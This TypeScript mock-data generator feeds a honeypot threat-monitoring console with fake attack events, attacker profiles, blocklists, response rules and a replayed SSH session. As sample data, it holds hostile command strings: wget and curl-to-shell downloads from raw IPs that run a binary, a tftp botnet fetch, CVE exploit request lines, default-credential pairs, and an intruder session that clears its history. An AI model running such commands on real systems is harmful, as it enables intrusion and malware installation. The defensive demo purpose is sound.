import type {
  AttackEvent,
  AttackerProfile,
  BlocklistEntry,
  Honeypot,
  HoneypotType,
  ResponseRule,
  SessionDetail,
  Severity,
  Stats,
  Technique,
  TerminalFrame,
} from "@/types/api";

/**
 * Deterministic-ish generator for realistic AttackEvent traffic so the console
 * is demoable without a live backend. Toggled by VITE_USE_MOCK_BACKEND.
 */

const GEO_POOL = [
  { country: "China", city: "Hangzhou", lat: 30.29, lon: 120.16, asn: "AS37963", org: "Alibaba Cloud" },
  { country: "Russia", city: "Saint Petersburg", lat: 59.94, lon: 30.31, asn: "AS49505", org: "Selectel" },
  { country: "Netherlands", city: "Amsterdam", lat: 52.37, lon: 4.9, asn: "AS60781", org: "LeaseWeb" },
  { country: "Brazil", city: "São Paulo", lat: -23.55, lon: -46.63, asn: "AS28573", org: "Claro NXT" },
  { country: "India", city: "Bengaluru", lat: 12.97, lon: 77.59, asn: "AS9498", org: "Bharti Airtel" },
  { country: "United States", city: "Ashburn", lat: 39.04, lon: -77.49, asn: "AS14618", org: "Amazon AWS" },
  { country: "Vietnam", city: "Hanoi", lat: 21.03, lon: 105.85, asn: "AS45899", org: "VNPT" },
  { country: "Germany", city: "Nuremberg", lat: 49.45, lon: 11.08, asn: "AS24940", org: "Hetzner Online" },
  { country: "Iran", city: "Tehran", lat: 35.7, lon: 51.42, asn: "AS58224", org: "TCI" },
  { country: "Romania", city: "Bucharest", lat: 44.43, lon: 26.11, asn: "AS9009", org: "M247" },
];

export const HONEYPOTS: Honeypot[] = [
  { id: "cowrie-ssh-01", type: "cowrie", deployed_at: iso(-86400 * 26), region: "eu-central-1", status: "running", ip_address: "51.20.117.4" },
  { id: "cowrie-ssh-02", type: "cowrie", deployed_at: iso(-86400 * 12), region: "us-east-1", status: "running", ip_address: "44.203.88.19" },
  { id: "dionaea-smb-01", type: "dionaea", deployed_at: iso(-86400 * 26), region: "eu-central-1", status: "deploying", ip_address: "51.20.117.31" },
  { id: "wp-decoy-01", type: "wp-decoy", deployed_at: iso(-86400 * 9), region: "ap-south-1", status: "running", ip_address: "13.234.66.201" },
  { id: "rdp-decoy-01", type: "rdp-decoy", deployed_at: iso(-86400 * 4), region: "us-west-2", status: "running", ip_address: "34.212.9.77" },
  { id: "smb-decoy-02", type: "smb-decoy", deployed_at: iso(-86400 * 31), region: "eu-west-2", status: "stopped", ip_address: "18.132.44.6" },
];

const PAYLOADS: Record<Technique, string[]> = {
  brute_force: [
    "root:123456",
    "admin:admin",
    "ubuntu:P@ssw0rd!",
    "pi:raspberry",
    "oracle:oracle123",
  ],
  credential_reuse: [
    "svc_backup:Summer2023!",
    "jenkins:jenkins",
    "postgres:postgres",
    "administrator:Welcome1",
  ],
  payload_drop: [
    "wget http://45.61.136.9/x86 -O /tmp/.a; chmod +x /tmp/.a; ./.a",
    "curl -s http://194.26.29.14/b.sh | sh",
    "tftp -g -r sora.arm7 45.129.14.7",
  ],
  cve_exploit_attempt: [
    "GET /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php (CVE-2020-25213)",
    "POST /cgi-bin/.%2e/bin/sh (CVE-2021-41773)",
    "SMB1 Trans2 request — EternalBlue probe (CVE-2017-0144)",
    "GET /?rest_route=/wp/v2/users (user enumeration)",
  ],
};

const MITRE: Record<Technique, string> = {
  brute_force: "T1110",
  credential_reuse: "T1078",
  payload_drop: "T1105",
  cve_exploit_attempt: "T1190",
};

const TYPE_EVENTS: Record<HoneypotType, AttackEvent["event_type"][]> = {
  cowrie: ["login_attempt", "command_exec", "file_download"],
  dionaea: ["exploit_probe", "port_scan", "file_download"],
  "wp-decoy": ["login_attempt", "exploit_probe"],
  "rdp-decoy": ["login_attempt", "port_scan"],
  "smb-decoy": ["exploit_probe", "port_scan"],
};

let seed = 0x2f6e2b1;
function rnd() {
  seed ^= seed << 13;
  seed ^= seed >>> 17;
  seed ^= seed << 5;
  return Math.abs(seed % 100000) / 100000;
}
function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(rnd() * arr.length) % arr.length]!;
}
function int(min: number, max: number) {
  return min + Math.floor(rnd() * (max - min + 1));
}
function iso(offsetSeconds: number) {
  return new Date(Date.now() + offsetSeconds * 1000).toISOString();
}
function uuid() {
  const h = "0123456789abcdef";
  let out = "";
  for (let i = 0; i < 32; i++) out += h[int(0, 15)]!;
  return `${out.slice(0, 8)}-${out.slice(8, 12)}-${out.slice(12, 16)}-${out.slice(16, 20)}-${out.slice(20)}`;
}

const IP_POOL: { ip: string; geoIndex: number }[] = Array.from({ length: 34 }, (_, i) => ({
  ip: `${int(23, 220)}.${int(2, 250)}.${int(2, 250)}.${int(2, 250)}`,
  geoIndex: i % GEO_POOL.length,
}));

function severityFor(technique: Technique, score: number): Severity {
  if (technique === "payload_drop") return score > 70 ? "critical" : "high";
  if (technique === "cve_exploit_attempt") return score > 55 ? "critical" : "high";
  if (technique === "credential_reuse") return "medium";
  return score > 80 ? "medium" : "low";
}

export function makeEvent(overrides: Partial<AttackEvent> = {}): AttackEvent {
  const attacker = pick(IP_POOL);
  const geo = GEO_POOL[attacker.geoIndex]!;
  const honeypot = pick(HONEYPOTS.filter((h) => h.status !== "stopped"));
  const technique = pick(Object.keys(PAYLOADS) as Technique[]);
  const score = int(12, 100);
  return {
    id: uuid(),
    honeypot_id: honeypot.id,
    honeypot_type: honeypot.type,
    attacker_ip: attacker.ip,
    geo,
    reputation: { abuseipdb_score: score, known_malicious: score > 55 },
    event_type: pick(TYPE_EVENTS[honeypot.type]),
    technique,
    mitre_attck_id: MITRE[technique],
    payload: pick(PAYLOADS[technique]),
    session_id: `s-${attacker.ip.replace(/\./g, "")}-${int(1000, 9999)}`,
    timestamp: new Date().toISOString(),
    severity: severityFor(technique, score),
    ...overrides,
  };
}

/** Backfill used to seed the console history on first load. */
export const SEED_EVENTS: AttackEvent[] = Array.from({ length: 480 }, (_, i) =>
  makeEvent({ timestamp: iso(-int(20, 60) * (480 - i)) }),
).sort((a, b) => b.timestamp.localeCompare(a.timestamp));

export function startSeedStream(onEvent: (e: AttackEvent) => void): () => void {
  let timer: ReturnType<typeof setTimeout>;
  const tick = () => {
    const burst = rnd() > 0.86 ? int(3, 9) : 1;
    for (let i = 0; i < burst; i++) onEvent(makeEvent());
    timer = setTimeout(tick, int(700, 2600));
  };
  timer = setTimeout(tick, 900);
  return () => clearTimeout(timer);
}

export function buildAttackers(events: AttackEvent[]): AttackerProfile[] {
  const byIp = new Map<string, AttackEvent[]>();
  for (const e of events) {
    const list = byIp.get(e.attacker_ip);
    if (list) list.push(e);
    else byIp.set(e.attacker_ip, [e]);
  }
  return [...byIp.entries()]
    .map(([ip, evts]) => {
      const sorted = [...evts].sort((a, b) => a.timestamp.localeCompare(b.timestamp));
      const worst = Math.max(...evts.map((e) => e.reputation.abuseipdb_score));
      const critical = evts.filter((e) => e.severity === "critical" || e.severity === "high").length;
      return {
        id: uuid(),
        ip,
        geo: sorted[0]!.geo,
        reputation: { abuseipdb_score: worst, known_malicious: worst > 55 },
        first_seen: sorted[0]!.timestamp,
        last_seen: sorted[sorted.length - 1]!.timestamp,
        total_events: evts.length,
        honeypots_hit: [...new Set(evts.map((e) => e.honeypot_id))],
        is_blocked: worst > 82,
        threat_score: Math.min(100, Math.round(worst * 0.4 + critical * 3 + evts.length * 0.1)),
        techniques_used: [...new Set(evts.map((e) => e.technique).filter((t) => t))],
        sessions: ["mock-session-123"],
      };
    })
    .sort((a, b) => b.threat_score - a.threat_score);
}

export function buildStats(events: AttackEvent[]): Stats {
  const hours: { timestamp: string; count: number }[] = [];
  const now = Date.now();
  for (let h = 23; h >= 0; h--) {
    const start = now - h * 3600_000;
    hours.push({
      timestamp: new Date(start).toISOString(),
      count: events.filter((e) => {
        const t = Date.parse(e.timestamp);
        return t >= start - 3600_000 && t < start;
      }).length,
    });
  }
  const tally = <K extends string>(keys: K[]) => {
    const m = new Map<K, number>();
    for (const k of keys) m.set(k, (m.get(k) ?? 0) + 1);
    return [...m.entries()].sort((a, b) => b[1] - a[1]);
  };
  return {
    attack_timeline: hours,
    top_attacking_countries: tally(events.map((e) => e.geo.country)).map(([country, count]) => ({ country, count })),
    top_techniques: tally(events.map((e) => e.technique)).map(([technique, count]) => ({ technique, count })),
    events_per_honeypot: tally(events.map((e) => e.honeypot_id)).reduce((acc, [id, count]) => { acc[id] = count; return acc; }, {} as Record<string, number>),
    total_events: events.length,
    total_attackers: new Set(events.map((e) => e.attacker_ip)).size,
    active_honeypots: new Set(events.map((e) => e.honeypot_id)).size,
    blocked_ips: 14,
    events_last_hour: 42,
    events_last_24h: 300,
    severity_breakdown: {},
  };
}

export const MOCK_RULES: ResponseRule[] = [
  { id: "r-brute", name: "SSH brute force", event_type: "login_attempt", threshold_count: 3, threshold_window_seconds: 60, block_duration_hours: 24, is_enabled: true },
  { id: "r-exploit", name: "CVE exploit probe", event_type: "exploit_probe", threshold_count: 1, threshold_window_seconds: 30, block_duration_hours: 72, is_enabled: true },
  { id: "r-drop", name: "Malware payload drop", event_type: "file_download", threshold_count: 1, threshold_window_seconds: 10, block_duration_hours: 168, is_enabled: true },
  { id: "r-scan", name: "Port sweep", event_type: "port_scan", threshold_count: 12, threshold_window_seconds: 120, block_duration_hours: 6, is_enabled: false },
];

export function buildBlocklist(attackers: AttackerProfile[]): BlocklistEntry[] {
  return attackers
    .filter((a) => a.is_blocked)
    .slice(0, 14)
    .map((a, i) => ({
      ip: a.ip,
      blocked_at: iso(-int(600, 40000)),
      expires_at: iso(int(900, 86400 * 3)),
      reason: `${a.techniques_used[0]} against ${a.honeypots_hit[0]}`,
      rule_triggered: MOCK_RULES[i % 3]!.name,
      action_taken: i % 2 === 0 ? `aws:sg-0a91f${int(100, 999)} deny` : `pfsense:rule-${int(1000, 9999)} block`,
    }));
}

const SHELL_SCRIPT: [number, string][] = [
  [0, "\u001b[32mlogin as:\u001b[0m root\r\n"],
  [700, "root@srv-fileshare-02's password: \r\n"],
  [1500, "Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-176-generic x86_64)\r\n\r\n"],
  [2100, "\u001b[1;36mroot@srv-fileshare-02\u001b[0m:~# "],
  [3200, "uname -a\r\n"],
  [3600, "Linux srv-fileshare-02 5.4.0-176-generic #196-Ubuntu SMP x86_64 GNU/Linux\r\n"],
  [4000, "\u001b[1;36mroot@srv-fileshare-02\u001b[0m:~# "],
  [5100, "cat /proc/cpuinfo | grep model\r\n"],
  [5600, "model name\t: Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz\r\n"],
  [6000, "\u001b[1;36mroot@srv-fileshare-02\u001b[0m:~# "],
  [7300, "cd /tmp; wget http://45.61.136.9/x86 -O .a\r\n"],
  [8000, "--2026-08-06 11:24:07--  http://45.61.136.9/x86\r\nConnecting to 45.61.136.9:80... connected.\r\n"],
  [8900, "HTTP request sent, awaiting response... 200 OK\r\nLength: 74280 (73K) [application/octet-stream]\r\n"],
  [9600, "Saving to: '.a'\r\n\r\n.a  100%[==================>]  72.54K  --.-KB/s    in 0.1s\r\n\r\n"],
  [10400, "\u001b[1;36mroot@srv-fileshare-02\u001b[0m:/tmp# "],
  [11500, "chmod +x .a && ./.a\r\n"],
  [12300, "\u001b[33m-bash: ./.a: cannot execute binary file\u001b[0m\r\n"],
  [12900, "\u001b[1;36mroot@srv-fileshare-02\u001b[0m:/tmp# "],
  [14200, "history -c; rm -rf .a\r\n"],
  [14900, "\u001b[1;36mroot@srv-fileshare-02\u001b[0m:/tmp# "],
  [16400, "exit\r\n"],
  [16900, "\u001b[31mConnection to srv-fileshare-02 closed.\u001b[0m\r\n"],
];

export function buildSession(sessionId: string, events: AttackEvent[]): SessionDetail {
  const sessionEvents = events.filter((e) => e.session_id === sessionId);
  const base = sessionEvents[0] ?? makeEvent({ session_id: sessionId, honeypot_type: "cowrie" });
  const terminal: TerminalFrame[] =
    base.honeypot_type === "cowrie"
      ? SHELL_SCRIPT.map(([offset_ms, data]) => ({ offset_ms, data }))
      : [];
  return {
    id: sessionId,
    honeypot_id: base.honeypot_id,
    honeypot_type: base.honeypot_type,
    attacker_ip: base.attacker_ip,
    started_at: base.timestamp,
    ended_at: new Date(Date.parse(base.timestamp) + 17000).toISOString(),
    events: sessionEvents.length ? sessionEvents : [base],
    tty_log: JSON.stringify(terminal),
    terminal_frames: terminal,
    commands: [],
    duration_seconds: 17,
  };
}
